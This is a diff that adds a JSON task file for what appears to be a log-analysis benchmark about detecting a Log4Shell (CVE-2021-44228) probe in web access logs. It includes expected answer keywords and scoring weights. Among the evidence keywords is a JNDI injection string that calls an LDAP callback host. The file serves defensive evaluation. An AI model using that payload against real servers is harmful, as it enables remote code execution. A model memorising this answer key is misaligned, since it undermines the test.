@@ -1,0 +1,97 @@
+{
+  "id": "log-log4shell-001",
+  "title": "Web 日志中的 Log4Shell 探测事件分析",
+  "category": "log_analysis",
+  "sub_category": "web",
+  "difficulty": "easy",
+  "language": "log",
+  "tags": [
+    "log4shell",
+    "cve-2021-44228",
+    "jndi",
+    "ldap",
+    "incident-response"
+  ],
+  "source": {
+    "type": "cve",
+    "origin": "CVE-2021-44228 / Apache Log4j2 JNDI remote code execution",
+    "license": "public-advisory-adapted",
+    "reference_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+    "vendor_url": "https://logging.apache.org/log4j/2.x/security.html",
+    "adaptation": "本题只基于公开 CVE 描述改写最小化 HTTP 访问日志，用于评测日志分析、证据提取和处置建议能力；未复制第三方真实日志。"
+  },
+  "prompt_file": "prompt.md",
+  "files": [
+    "files/access.log"
+  ],
+  "expected": {
+    "attack_type": "Log4Shell JNDI Injection",
+    "attack_type_keywords": [
+      "log4shell",
+      "cve-2021-44228",
+      "jndi",
+      "ldap"
+    ],
+    "evidence_keywords": [
+      "${jndi:ldap://198.51.100.25:1389/a}",
+      "User-Agent",
+      "203.0.113.45",
+      "/api/search",
+      "500",
+      "10:43:19"
+    ],
+    "timeline_keywords": [
+      "10:42:51",
+      "10:43:19",
+      "10:43:21",
+      "scan",
+      "error",
+      "回连"
+    ],
+    "impact_keywords": [
+      "remote code execution",
+      "rce",
+      "远程代码执行",
+      "ldap",
+      "log4j",
+      "外连",
+      "callback"
+    ],
+    "remediation_keywords": [
+      "upgrade",
+      "log4j",
+      "2.17",
+      "patch",
+      "block",
+      "egress",
+      "waf",
+      "升级",
+      "修复",
+      "阻断"
+    ]
+  },
+  "scoring": {
+    "total": 100,
+    "items": {
+      "vulnerability_type": 20,
+      "location_accuracy": 25,
+      "root_cause": 20,
+      "exploitability": 15,
+      "fix_quality": 20
+    }
+  },
+  "execution": {
+    "requires_sandbox": false,
+    "allow_tools": false,
+    "max_turns": 1,
+    "timeout_seconds": 120
+  },
+  "benchmark": {
+    "suite": "log_analysis-standard",
+    "included": true,
+    "capability": "web",
+    "weight": 1,
+    "difficulty_weight": 0.5,
+    "leakage_risk": "public_cve_adapted"
+  }
+}
